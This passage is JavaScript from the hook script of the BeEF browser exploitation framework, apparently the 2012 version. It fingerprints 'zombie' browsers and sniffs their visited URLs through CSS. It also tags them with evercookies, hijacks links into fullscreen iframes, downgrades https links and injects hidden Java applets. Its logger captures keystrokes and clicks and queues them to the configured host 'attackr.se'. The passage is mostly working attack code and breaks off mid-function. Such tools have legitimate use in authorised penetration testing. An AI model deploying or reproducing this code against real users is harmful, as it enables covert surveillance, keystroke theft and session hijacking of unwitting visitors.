		if(has_activex) details['HasActiveX'] = has_activex;
		if(has_session_cookies) details["hasSessionCookies"] = has_session_cookies;
		if(has_persistent_cookies) details["hasPersistentCookies"] = has_persistent_cookies;

		return details;
	},
	
	/**
	 * Returns array of results, whether or not the target zombie has visited the specified URL
	 */
	hasVisited: function(urls) {
		var results = new Array();
		var iframe = beef.dom.createInvisibleIframe();
		var ifdoc = (iframe.contentDocument) ? iframe.contentDocument : iframe.contentWindow.document;
		ifdoc.open();
		ifdoc.write('<style>a:visited{width:0px !important;}</style>');
		ifdoc.close();
		urls = urls.split("\n");
		var count = 0;
		for (var i in urls)
		{
			var u = urls[i];
			if (u != "" || u != null)
			{
				var success = false;
				var a = ifdoc.createElement('a');
				a.href = u;
				ifdoc.body.appendChild(a);
				var width = null;
				(a.currentStyle) ? width = a.currentStyle['width'] : width = ifdoc.defaultView.getComputedStyle(a, null).getPropertyValue("width"); 
				if (width == '0px') {
					success = true;
				}
				results.push({'url':u, 'visited':success});
				count++;
			}
		}
		beef.dom.removeElement(iframe);
		if (results.length == 0) 
		{
			return false;
		}
		return results;
	},

	/**
	 * Checks if the zombie has Web Sockets enabled.
	 * @return: {Boolean} true or false.
	 * In FF6+ the websocket object has been prefixed with Moz, so now it's called MozWebSocket
	 * */
	hasWebSocket: function() {
		if (!!window.WebSocket || !!window.MozWebSocket) return true; else return false;
	},

	/**
	 * Checks if the zombie has Google Gears installed.
	 * @return: {Boolean} true or false.
	 *
	 * @from: https://code.google.com/apis/gears/gears_init.js
	 * */
	hasGoogleGears: function() {

		var ggfactory = null;

		// Chrome
		if (window.google && google.gears) return true;

		// Firefox
		if (typeof GearsFactory != 'undefined') {
			ggfactory = new GearsFactory();
		} else {
			// IE
			try {
				ggfactory = new ActiveXObject('Gears.Factory');
				// IE Mobile on WinCE.
				if (ggfactory.getBuildInfo().indexOf('ie_mobile') != -1) {
					ggfactory.privateSetGlobalObject(this);
				}
			} catch (e) {
				// Safari
				if ((typeof navigator.mimeTypes != 'undefined')
						&& navigator.mimeTypes["application/x-googlegears"]) {
					ggfactory = document.createElement("object");
					ggfactory.style.display = "none";
					ggfactory.width = 0;
					ggfactory.height = 0;
					ggfactory.type = "application/x-googlegears";
					document.documentElement.appendChild(ggfactory);
					if(ggfactory && (typeof ggfactory.create == 'undefined')) ggfactory = null;
				}
			}
		}
		if (!ggfactory) return false; else return true;
	},

	/**
	 * Dynamically changes the favicon: works in Firefox, Chrome and Opera
	 **/
	changeFavicon: function(favicon_url) {
		var iframe = null;
		if (this.isC()) {
			iframe = document.createElement('iframe');
			iframe.src = 'about:blank';
			iframe.style.display = 'none';
			document.body.appendChild(iframe);
		}
		var link = document.createElement('link'),
		oldLink = document.getElementById('dynamic-favicon');
		link.id = 'dynamic-favicon';
		link.rel = 'shortcut icon';
		link.href = favicon_url;
		if (oldLink) document.head.removeChild(oldLink);
		document.head.appendChild(link);
		if (this.isC()) iframe.src += '';
	},

	/**
	 * Changes page title
	 **/
	changePageTitle: function(title) {
		document.title = title;
	},

	/**
	 *  A function that gets the max number of simultaneous connections the
	 *  browser can make per domain, or globally on all domains.
	 *
	 *  This code is based on research from browserspy.dk
	 *
	 * @parameter {ENUM: 'PER_DOMAIN', 'GLOBAL'=>default}
	 * @return {Deferred promise} A jQuery deferred object promise, which when resolved passes
	 *	the number of connections to the callback function as "this"
	 *
	 *	example usage:
	 *		$j.when(getMaxConnections()).done(function(){
	 *			console.debug("Max Connections: " + this);
	 *			});
	 *
	 */
	getMaxConnections: function(scope) {

		var imagesCount = 30;		// Max number of images to test
		var secondsTimeout = 5;		// Image load timeout threashold
		var testUrl ="";		// The image testing service URL

		// User broserspy.dk max connections service URL.
		if(scope=='PER_DOMAIN')
			 testUrl = "http://browserspy.dk/connections.php?img=1&amp;random=";
		else
			// The token will be replaced by a different number with each request(different domain).
			testUrl = "http://<token>.browserspy.dk/connections.php?img=1&amp;random=";


		var imagesLoaded = 0;			// Number of responding images before timeout.
		var imagesRequested = 0;		// Number of requested images.
		var testImages = new Array();		// Array of all images.
		var deferredObject = $j.Deferred();	// A jquery Deferred object.

		for (var i = 1; i <= imagesCount; i++)
		{
			// Asynchronously request image.
			testImages[i] =
				$j.ajax({
					type: "get",
					dataType: true,
					url: (testUrl.replace("<token>",i)) + Math.random(),
					data: "",
					timeout: (secondsTimeout * 1000),

					// Function on completion of request.
					complete: function(jqXHR, textStatus){

						imagesRequested++;

						// If the image returns a 200 or a 302, the text Status is "error", else null
						if(textStatus == "error")
						{
							imagesLoaded++;
						}

						// If all images requested
						if(imagesRequested >= imagesCount)
						{
							// resolve the deferred object passing the number of loaded images.
							deferredObject.resolveWith(imagesLoaded);
						}
					 }
				});

		}

		// Return a promise to resolve the deffered object when the images are loaded.
		return deferredObject.promise();

	}
	
};

beef.regCmp('beef.browser');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.browser.cookie
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://techpatterns.com/downloads/javascript_cookies.php
 * Original author unknown.
 * 
 */
beef.browser.cookie = {
	
		setCookie: function (name, value, expires, path, domain, secure) 
		{
	
			var today = new Date();
			today.setTime( today.getTime() );
	
			if ( expires )
			{
				expires = expires * 1000 * 60 * 60 * 24;
			}
			var expires_date = new Date( today.getTime() + (expires) );
	
			document.cookie = name + "=" +escape( value ) +
				( ( expires ) ? ";expires=" + expires_date.toGMTString() : "" ) +
				( ( path ) ? ";path=" + path : "" ) +
				( ( domain ) ? ";domain=" + domain : "" ) +
				( ( secure ) ? ";secure" : "" );
		},

		getCookie: function(name) 
		{
			var a_all_cookies = document.cookie.split( ';' );
			var a_temp_cookie = '';
			var cookie_name = '';
			var cookie_value = '';
			var b_cookie_found = false;
			
			for ( i = 0; i < a_all_cookies.length; i++ )
			{
				a_temp_cookie = a_all_cookies[i].split( '=' );
				cookie_name = a_temp_cookie[0].replace(/^\s+|\s+$/g, '');
				if ( cookie_name == name )
				{
					b_cookie_found = true;
					if ( a_temp_cookie.length > 1 )
					{
						cookie_value = unescape( a_temp_cookie[1].replace(/^\s+|\s+$/g, '') );
					}
					return cookie_value;
					break;
				}
				a_temp_cookie = null;
				cookie_name = '';
			}
			if ( !b_cookie_found )
			{
				return null;
			}
		},

		deleteCookie: function (name, path, domain) 
		{
			if ( this.getCookie(name) ) document.cookie = name + "=" +
			( ( path ) ? ";path=" + path : "") +
			( ( domain ) ? ";domain=" + domain : "" ) +
			";expires=Thu, 01-Jan-1970 00:00:01 GMT";
		},
		
		hasSessionCookies: function (name)
		{
			var name = name || "cookie";
			if (name == "") name = "cookie";
			this.setCookie( name, 'none', '', '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		},

		hasPersistentCookies: function (name)
		{
			var name = name || "cookie";
			if (name == "") name = "cookie";
			this.setCookie( name, 'none', 1, '/', '', '' );

			cookiesEnabled = (this.getCookie(name) == null)? false:true;
			this.deleteCookie(name, '/', '');
			return cookiesEnabled;
			
		}	
					
};

beef.regCmp('beef.browser.cookie');

//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.browser.popup
 * 
 * Provides fuctions for working with cookies. 
 * Several functions adopted from http://davidwalsh.name/popup-block-javascript
 * Original author unknown.
 * 
 */
beef.browser.popup = {
	
		blocker_enbabled: function ()
		{
			screenParams = beef.browser.getScreenParams();
			var popUp = window.open('/', 'windowName0', 'width=1, height=1, left='+screenParams.width+', top='+screenParams.height+', scrollbars, resizable');
			if (popUp == null || typeof(popUp)=='undefined') {   
			  	return true;
			} else {   
				popUp.close();
				return false;
			}
		}
};

beef.regCmp('beef.browser.popup');

//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.session
 *
 * Provides basic session functions.
 */
beef.session = {
	
	hook_session_id_length: 80,
	hook_session_id_chars: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",	
	ec: new evercookie(),	
	
	/**
	 * Gets a string which will be used to identify the hooked browser session
	 * 
	 * @example: var hook_session_id = beef.session.get_hook_session_id();
	 */
  	get_hook_session_id: function() {
		// check if the browser is already known to the framework
		var id = this.ec.evercookie_cookie("BEEFHOOK");
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_userdata("BEEFHOOK");
		}
		if (typeof id == 'undefined') {
			var id = this.ec.evercookie_window("BEEFHOOK");
		}
		
		// if the browser is not known create a hook session id and set it
		if ((typeof id == 'undefined') || (id == null)) {
			id = this.gen_hook_session_id();
			this.set_hook_session_id(id);
		}
		
		// return the hooked browser session identifier
		return id;
	},
	
	/**
	 * Sets a string which will be used to identify the hooked browser session
	 * 
	 * @example: beef.session.set_hook_session_id('RANDOMSTRING');
	 */
  	set_hook_session_id: function(id) {
		// persist the hook session id
		this.ec.evercookie_cookie("BEEFHOOK", id);
		this.ec.evercookie_userdata("BEEFHOOK", id);
		this.ec.evercookie_window("BEEFHOOK", id);
	},
	
	/**
	 * Generates a random string using the chars in hook_session_id_chars.
	 * 
	 * @example: beef.session.gen_hook_session_id();
	 */
  	gen_hook_session_id: function() {
	    // init the return value
		var hook_session_id = "";
		
		// construct the random string 
		for(var i=0; i<this.hook_session_id_length; i++) {
		  var rand_num = Math.floor(Math.random()*this.hook_session_id_chars.length);
		  hook_session_id += this.hook_session_id_chars.charAt(rand_num);
		}
		
		return hook_session_id;
	},

	/**
	 * Overrides each link, and creates an iframe (loading the href) instead of following the link
	 */
	persistant: function() {
		$j('a').click(function(e) {
			if ($j(this).attr('href') != '')
			{
				e.preventDefault();
				beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
				$j(document).attr('title', $j(this).html());
				document.body.scroll = "no";
				document.documentElement.style.overflow = 'hidden';
			}
		});
	}
	

				
};

beef.regCmp('beef.session');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.os = {

	ua: navigator.userAgent,
	
	isWin311: function() {
		return (this.ua.indexOf("Win16") != -1) ? true : false;
	},
	
	isWinNT4: function() {
		return (this.ua.match('(Windows NT 4.0)')) ? true : false;
	},
	
	isWin95: function() {
		return (this.ua.match('(Windows 95)|(Win95)|(Windows_95)')) ? true : false;
	},
	
	isWin98: function() {
		return (this.ua.match('(Windows 98)|(Win98)')) ? true : false;
	},
	
	isWinME: function() {
		return (this.ua.indexOf('Windows ME') != -1) ? true : false;
	},
	
	isWin2000: function() {
		return (this.ua.match('(Windows NT 5.0)|(Windows 2000)')) ? true : false;
	},
	
	isWinXP: function() {
		return (this.ua.match('(Windows NT 5.1)|(Windows XP)')) ? true : false;
	},
	
	isWinServer2003: function() {
		return (this.ua.match('(Windows NT 5.2)')) ? true : false;
	},
	
	isWinVista: function() {
		return (this.ua.match('(Windows NT 6.0)')) ? true : false;
	},
	
	isWin7: function() {
		return (this.ua.match('(Windows NT 6.1)|(Windows NT 7.0)')) ? true : false;
	},
	
	isOpenBSD: function() {
		return (this.ua.indexOf('OpenBSD') != -1) ? true : false;
	},
	
	isSunOS: function() {
		return (this.ua.indexOf('SunOS') != -1) ? true : false;
	},
	
	isLinux: function() {
		return (this.ua.match('(Linux)|(X11)')) ? true : false;
	},
	
	isMacintosh: function() {
		return (this.ua.match('(Mac_PowerPC)|(Macintosh)|(MacIntel)')) ? true : false;
	},
	
	isIphone: function() {
		return (this.ua.indexOf('iPhone') != -1) ? true : false;
	},

	isIpad: function() {
		return (this.ua.indexOf('iPad') != -1) ? true : false;
	},

	isIpod: function() {
		return (this.ua.indexOf('iPod') != -1) ? true : false;
	},

	isNokia: function() {
		return (this.ua.match('(Maemo Browser)|(Symbian)|(Nokia)')) ? true : false;
	},

	isAndroid: function() {
		return (this.ua.match('Android')) ? true : false;
	},

	isBlackBerry: function() {
		return (this.ua.match('BlackBerry')) ? true : false;
	},

	isQNX: function() {
		return (this.ua.match('QNX')) ? true : false;
	},
	
	isBeOS: function() {
		return (this.ua.match('BeOS')) ? true : false;
	},
	
	getName: function() {
		//windows
		if(this.isWin311()) return 'Windows 3.11';
		if(this.isWinNT4()) return 'Windows NT 4';
		if(this.isWin95()) return 'Windows 95';
		if(this.isWin98()) return 'Windows 98';
		if(this.isWinME()) return 'Windows Millenium';
		if(this.isWin2000()) return 'Windows 2000';
		if(this.isWinXP()) return 'Windows XP';
		if(this.isWinServer2003()) return 'Windows Server 2003';
		if(this.isWinVista()) return 'Windows Vista';
		if(this.isWin7()) return 'Windows 7';

		//Nokia
		if(this.isNokia()) {

			if (this.ua.indexOf('Maemo Browser') != -1) return 'Maemo';
			if (this.ua.match('(SymbianOS)|(Symbian OS)')) return 'SymbianOS';
			if (this.ua.indexOf('Symbian') != -1) return 'Symbian';

			//return 'Nokia';
		}

		// BlackBerry
		if(this.isBlackBerry()) return 'BlackBerry OS';

		// Android
		if(this.isAndroid()) return 'Android';

		//linux
		if(this.isLinux()) return 'Linux';
		if(this.isSunOS()) return 'Sun OS';

		//iPhone
		if (this.isIphone()) return 'iPhone';
		//iPad
		if (this.isIpad()) return 'iPad';
		//iPod
		if (this.isIpod()) return 'iPod';
		
		//macintosh
		if(this.isMacintosh()) {
			if((typeof navigator.oscpu != 'undefined') && (navigator.oscpu.indexOf('Mac OS')!=-1))
				return navigator.oscpu;
				
			return 'Macintosh';
		}
		
		//others
		if(this.isQNX()) return 'QNX';
		if(this.isBeOS()) return 'BeOS';
		
		return 'unknown';
	}
};

beef.regCmp('beef.net.os');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.dom
 *
 * Provides functionality to manipulate the DOM.
 */
beef.dom = {
	
	/**
	 * Generates a random ID for HTML elements
	 * @param: {String} prefix: a custom prefix before the random id. defaults to "beef-"
	 * @return: generated id
	 */
	generateID: function(prefix) {
		return ((prefix == null) ? 'beef-' : prefix)+Math.floor(Math.random()*99999);
	},	
		
	/**
	 * Creates a new element but does not append it to the DOM.
	 * @param: {String} the name of the element.
	 * @param: {Literal Object} the attributes of that element.
	 * @return: the created element.
	 */
	createElement: function(type, attributes) {
		var el = document.createElement(type);
		
		for(index in attributes) {
			if(typeof attributes[index] == 'string') {
				el.setAttribute(index, attributes[index]);
			}
		}
		
		return el;
	},
	
	/**
	 * Removes element from the DOM.
	 * @param: {String or DOM Object} the target element to be removed.
	 */
	removeElement: function(el) {
		if (!beef.dom.isDOMElement(el))
		{
			el = document.getElementById(el);
		}
		try {
			el.parentNode.removeChild(el);
		} catch (e) { }
	},
	
	/**
	 * Tests if the object is a DOM element.
	 * @param: {Object} the DOM element.
	 * @return: true if the object is a DOM element.
	 */
	isDOMElement: function(obj) {
		return (obj.nodeType) ? true : false;
	},
	
	/**
	 * Creates an invisible iframe on the hook browser's page.
	 * @return: the iframe.
	 */
	createInvisibleIframe: function() {
		var iframe = this.createElement('iframe', {
				width: '1px',
				height: '1px',
				style: 'visibility:hidden;'
			});
		
		document.body.appendChild(iframe);
		
		return iframe;
	},
	
	/**
     * Create and iFrame element. In case it's create with POST method, the iFrame is automatically added to the DOM and submitted.
     * example usage in the code: beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
	 * @param: {String} type: can be 'hidden' or 'fullScreen'. defaults to normal
	 * @param: {String} method: can be 'GET' or 'POST'. defaults to GET
	 * @param: {Hash} params: list of params that will be sent in request.
	 * @param: {Hash} styles: css styling attributes, these are merged with the defaults specified in the type parameter
	 * @param: {Function} a callback function to fire once the iFrame has loaded
	 * @return: {Object} the inserted iFrame
	 */
	createIframe: function(type, method, params, styles, onload) {
		var css = {};
		var form_submit = (method.toLowerCase() == 'post') ? true : false; 
		if (form_submit && params['src'])
		{
			var form_action = params['src'];
			params['src'] = '';
		}
		if (type == 'hidden') { css = $j.extend(true, {'border':'none', 'width':'1px', 'height':'1px', 'display':'none', 'visibility':'hidden'}, styles); }
		if (type == 'fullscreen') { css = $j.extend(true, {'border':'none', 'background-color':'white', 'width':'100%', 'height':'100%', 'position':'absolute', 'top':'0px', 'left':'0px'}, styles); $j('body').css({'padding':'0px', 'margin':'0px'}); }
		var iframe = $j('<iframe />').attr(params).css(css).load(onload).prependTo('body');
		
		if (form_submit && form_action)
		{
			var id = beef.dom.generateID();
			$j(iframe).attr({'id': id, 'name':id});
			var form = beef.dom.createForm({'action':form_action, 'method':'get', 'target':id}, false);
			$j(form).prependTo('body').submit();
		}
		return iframe;
	},
	
	/**
     * Create a form element with the specified parameters, appending it to the DOM if append == true
	 * @param: {Hash} params: params to be applied to the form element
	 * @param: {Boolean} append: automatically append the form to the body
	 * @return: {Object} a form object
	 */
	createForm: function(params, append) {
		var form = $j('<form></form>').attr(params);
		if (append)
			$j('body').append(form);
		return form;
	},
	
	/**
	 * Get the location of the current page.
	 * @return: the location.
	 */
	getLocation: function() {
		return document.location.href;
	},
	
	/**
	 * Get links of the current page.
	 * @return: array of URLs.
	 */
	getLinks: function() {
		var linksarray = [];
		var links = document.links;
		for(var i = 0; i<links.length; i++) {
			linksarray = linksarray.concat(links[i].href)		
		};
		return linksarray
	},
	
	/**
	 * Rewrites all links matched by selector to url, also rebinds the click method to simply return true
	 * @param: {String} url: the url to be rewritten
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinks: function(url, selector) {
		var sel = (selector == null) ? 'a' : selector;
		return $j(sel).each(function() {
			if ($j(this).attr('href') != null)
			{
				$j(this).attr('href', url).click(function() { return true; });
			}
		}).length;
	},

	/**
     * Parse all links in the page matched by the selector, replacing old_protocol with new_protocol (ex.:https with http)
	 * @param: {String} old_protocol: the old link protocol to be rewritten
	 * @param: {String} new_protocol: the new link protocol to be written
	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
	 * @return: {Number} the amount of links found in the DOM and rewritten.
	 */
	rewriteLinksProtocol: function(old_protocol, new_protocol, selector) {

		var count = 0;
		var re = new RegExp(old_protocol+"://", "gi");
		var sel = (selector == null) ? 'a' : selector;

		$j(sel).each(function() {
			if ($j(this).attr('href') != null) {
				var url = $j(this).attr('href');
				if (url.match(re)) {
					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
					count++;
				}
			}
		});

		return count;
	},

    /**
     *  Given an array of objects (key/value), return a string of param tags ready to append in applet/object/embed
     * @params: {Array} an array of params for the applet, ex.: [{'argc':'5', 'arg0':'ReverseTCP'}]
     * @return: {String} the parameters as a string ready to append to applet/embed/object tags (ex.: <param name='abc' value='test' />).
     */
    parseAppletParams: function(params){
         var result = '';
         for (i in params){
           var param = params[i];
           for(key in param){
              result += "<param name='" + key + "' value='" + param[key] + "' />";
           }
         }
        return result;
    },

    /**
     * Attach an applet to the DOM, using the best approach for differet browsers (object/applet/embed).
     * example usage in the code, using a JAR archive (recommended and faster):
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D.class', null, 'http://127.0.0.1:3000/ui/media/images/target.jar', [{'param1':'1', 'param2':'2'}]);
     * example usage in the code, using codebase:
     * beef.dom.attachApplet('appletId', 'appletName', 'SuperMario3D', 'http://127.0.0.1:3000/', null, null);
     * @params: {String} id: reference identifier to the applet.
     * @params: {String} code: name of the class to be loaded. For example, beef.class.
     * @params: {String} codebase: the URL of the codebase (usually used when loading a single class for an unsigned applet).
     * @params: {String} archive: the jar that contains the code.
     * @params: {String} params: an array of additional params that the applet except.
     */
    attachApplet: function(id, name, code, codebase, archive, params) {
        var content = null;
        if (beef.browser.isIE()) {
            content = "" + // the classid means 'use the latest JRE available to launch the applet'
                "<object id='" + id + "'classid='clsid:8AD9C840-044E-11D1-B3E9-00805F499D93' " +
                "height='0' width='0' name='" + name + "'> " +
                "<param name='code' value='" + code + "' />";

            if (codebase != null) {
                content += "<param name='codebase' value='" + codebase + "' />"
            }else{
                content += "<param name='archive' value='" + archive + "' />";
            }
            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</object>";
        }
        if (beef.browser.isC() || beef.browser.isS() || beef.browser.isO()) {

            if (codebase != null) {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<applet id='" + id + "' code='" + code + "' " +
                    "archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</applet>";
        }
        if (beef.browser.isFF()) {
            if (codebase != null) {
                content = "" +
                    "<embed id='" + id + "' code='" + code + "' " +
                    "type='application/x-java-applet' codebase='" + codebase + "' " +
                    "height='0' width='0' name='" + name + "'>";
            } else {
                content = "" +
                    "<embed id='" + id + "' code='" + code + "' " +
                    "type='application/x-java-applet' archive='" + archive + "' " +
                    "height='0' width='0' name='" + name + "'>";
            }

            if (params != null) {
                content += beef.dom.parseAppletParams(params);
            }
            content += "</embed>";
        }
        $j('body').append(content);
    },

    /**
     * Given an id, remove the applet from the DOM.
     * @params: {String} id: reference identifier to the applet.
     */
    detachApplet: function(id) {
        $j('#' + id + '').detach();
    }


	
};

beef.regCmp('beef.dom');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.logger
 *
 * Provides logging capabilities.
 */
beef.logger = {
	
	running: false,
    /**
    * Internal logger id
    */
    id: 0,
	/**
	 * Holds events created by user, to be sent back to BeEF
	 */
	events: [],
	/**
	 * Holds current stream of key presses
	 */
	stream: [],
	/**
	 * Contains current target of key presses
	 */
	target: null,
	/**
	 * Holds the time the logger was started
	 */
	time: null,
    /**
    * Holds the event details to be sent to BeEF
    */
    e: function() {
        this.id = beef.logger.get_id();
        this.time = beef.logger.get_timestamp();
        this.type = null;
        this.x = 0;
        this.y = 0;
        this.target = null;
        this.data = null;
    },
	
	/**
	 * Starts the logger
	 */
	start: function() {
		this.running = true;
		var d = new Date();
		this.time = d.getTime();
		$j(document).keypress(
			function(e) { beef.logger.keypress(e); }
		).click(
			function(e) { beef.logger.click(e); }
		);
		$j(window).focus(
			function(e) { beef.logger.win_focus(e); }
		).blur(
			function(e) { beef.logger.win_blur(e); }
		);
		/*$j('form').submit(
			function(e) { beef.logger.submit(e); }
		);*/
	},
	
	/**
	 * Stops the logger
	 */
	stop: function() {
		this.running = false;
		clearInterval(this.timer);
		$j(document).keypress(null);
	},

    /**
    * Get id
    */
    get_id: function() {
        this.id++;
        return this.id;
    },

	/**
	 * Click function fires when the user clicks the mouse.
	 */
	click: function(e) {
        var c = new beef.logger.e();
        c.type = 'click';
        c.x = e.pageX;
        c.y = e.pageY;
        c.target = beef.logger.get_dom_identifier(e.target);
        this.events.push(c);
	},
	
	/**
	 * Fires when the window element has regained focus
	 */
	win_focus: function(e) {
        var f = new beef.logger.e();
        f.type = 'focus';
        this.events.push(f);
	},
	
	/**
	 * Fires when the window element has lost focus
	 */
	win_blur: function(e) {
        var b = new beef.logger.e();
        b.type = 'blur';
		this.events.push(b);
	},
	
	/**
	 * Keypress function fires everytime a key is pressed.
	 * @param {Object} e: event object
	 */
	keypress: function(e) {
		if (this.target == null || ($j(this.target).get(0) !== $j(e.target).get(0)))
		{
			beef.logger.push_stream();
			this.target = e.target;
		}
		this.stream.push({'char':e.which, 'modifiers': {'alt':e.altKey, 'ctrl':e.ctrlKey, 'shift':e.shiftKey}});
	},
	
	/**
	 * Is called whenever a form is submitted
     * TODO: Cleanup this function
	 */
	submit: function(e) {
		/*this.events.push('Form submission: Action: '+$j(e.target).attr('action')+' Method: '+$j(e.target).attr('method')+' @ '+beef.logger.get_timestamp()+'s > '+beef.logger.get_dom_identifier(e.target));*/
	},
	
	/**
	 * Pushes the current stream to the events queue
	 */
	push_stream: function() {
		if (this.stream.length > 0)
		{
			this.events.push(beef.logger.parse_stream());
			this.stream = [];
		}
	},
	
	/**
	 * Translate DOM Object to a readable string
	 */
	get_dom_identifier: function(target) {
		target = (target == null) ? this.target : target;
		var id = '';
		if (target)
		{
			id = target.tagName.toLowerCase();
			id += ($j(target).attr('id')) ? '#'+$j(target).attr('id') : ' ';
			id += ($j(target).attr('name')) ? '('+$j(target).attr('name')+')' : '';
		}
		return id;
	},
	
	/**
	 * Formats the timestamp
	 * @return {String} timestamp string
	 */
	get_timestamp: function() {
		var d = new Date();
		return ((d.getTime() - this.time) / 1000).toFixed(3);
	},
	
	/**
	 * Parses stream array and creates history string
	 */
	parse_stream: function() {
		var s = '';
		for (var i in this.stream)
		{
			//s += (this.stream[i]['modifiers']['alt']) ? '*alt* ' : '';
			//s += (this.stream[i]['modifiers']['ctrl']) ? '*ctrl* ' : '';
			//s += (this.stream[i]['modifiers']['shift']) ? 'Shift+' : '';
			s += String.fromCharCode(this.stream[i]['char']);
		}
        var k = new beef.logger.e();
        k.type = 'keys';
        k.target = beef.logger.get_dom_identifier();
        k.data = s;
        return k;
	},
	
	/**
	 * Queue results to be sent back to framework
	 */
	queue: function() {
		beef.logger.push_stream();
		if (this.events.length > 0)
		{
			beef.net.queue('/event', 0, this.events);
			this.events = [];
		}
	}
		
};

beef.regCmp('beef.logger');


//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
/*!
 * @literal object: beef.net
 *
 * Provides basic networking functions.
 */
beef.net = {

    host: "attackr.se",
    port: "3000",
    hook: "/hook.js",
    handler: '/dh',
    chop: 500,
    pad: 30, //this is the amount of padding for extra params such as pc, pid and sid
    sid_count: 0,
    cmd_queue: [],

    //Command object
    command: function() {
        this.cid = null;
        this.results = null;
        this.handler = null;
        this.callback = null;
    },

    //Packet object
    packet: function() {
        this.id = null;
        this.data = null;
    },

    //Stream object
    stream: function() {
        this.id = null;
        this.packets = [];
        this.pc = 0;
        this.get_base_url_length = function() {
            return (this.url + this.handler + '?' + 'bh=' + beef.session.get_hook_session_id()).length;
        },
            this.get_packet_data = function() {
                var p = this.packets.shift();
                return {'bh':beef.session.get_hook_session_id(), 'sid':this.id, 'pid':p.id, 'pc':this.pc, 'd':p.data }
            };
    },

    /**
     * Response Object - used in the beef.net.request callback
     * Note: as we are using async mode, the response object will be empty if returned.Using sync mode, request obj fields will be populated.
     */
    response: function() {
        this.status_code = null;        // 500, 404, 200, 302
        this.status_text = null;        // success, timeout, error, ...
        this.response_body = null;      // "<html>…." if not a cross domain request
        this.port_status = null;        // tcp port is open, closed or not http
        this.was_cross_domain = null;   // true or false
        this.was_timedout = null;       // the user specified timeout was reached
        this.duration = null;           // how long it took for the request to complete
        this.headers = null;            // full response headers
    },

    //Queues the command, to be sent back to the framework on the next refresh
    queue: function(handler, cid, results, callback) {
        if (typeof(handler) === 'string' && typeof(cid) === 'number' && (callback === undefined || typeof(callback) === 'function')) {
            var s = new beef.net.command();
            s.cid = cid;
            s.results = beef.net.clean(results);
            s.callback = callback;
